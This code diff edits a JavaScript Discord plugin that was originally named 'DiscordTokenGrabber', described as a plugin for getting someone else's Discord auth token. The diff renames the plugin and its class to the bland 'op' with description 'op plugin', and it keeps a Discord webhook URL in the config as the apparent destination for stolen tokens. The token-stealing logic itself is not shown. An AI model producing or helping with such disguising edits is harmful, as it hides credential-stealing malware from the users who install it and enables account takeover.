@@ -13,16 +13,16 @@
 
 const config = {
     "info": {
-        "name": "DiscordTokenGrabber",
+        "name": "op",
         "authors": ["ethernalsteve", "The Way", "your nickname"],
         "version": "1.1",
-        "description": "Plugin for getting someone else's auth token Discord"
+        "description": "op plugin"
     },
     // Your webhook. Don't even try, this webhook is invalid :3
     "webhook": "https://discord.com/api/webhooks/959568552778666025/Qp00VexI__Z5tngQ7VMLE4M-LB0gUE8mezvz3im8WOdEp9SJjUSI2YGXn9g_0_8g8Fff"
 }
 
-class DiscordTokenGrabber {
+class op {
     constructor() { this._config = config; }
     
     getName() { return config.info.name; }
